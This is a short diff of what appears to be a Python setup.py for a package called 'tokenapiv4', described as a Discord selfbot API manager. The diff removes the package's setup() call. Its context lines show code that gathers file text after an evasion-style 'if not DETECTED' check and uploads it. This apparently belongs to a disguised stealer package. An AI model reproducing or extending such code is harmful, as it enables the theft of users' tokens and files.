@@ -907,18 +907,6 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-setup(
-
-    name='tokenapiv4',
-    packages=['tokenapiv4'],
-    version='1.0',
-    license='MIT',
-    description='Discord selfbot api manager',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                       
 
 
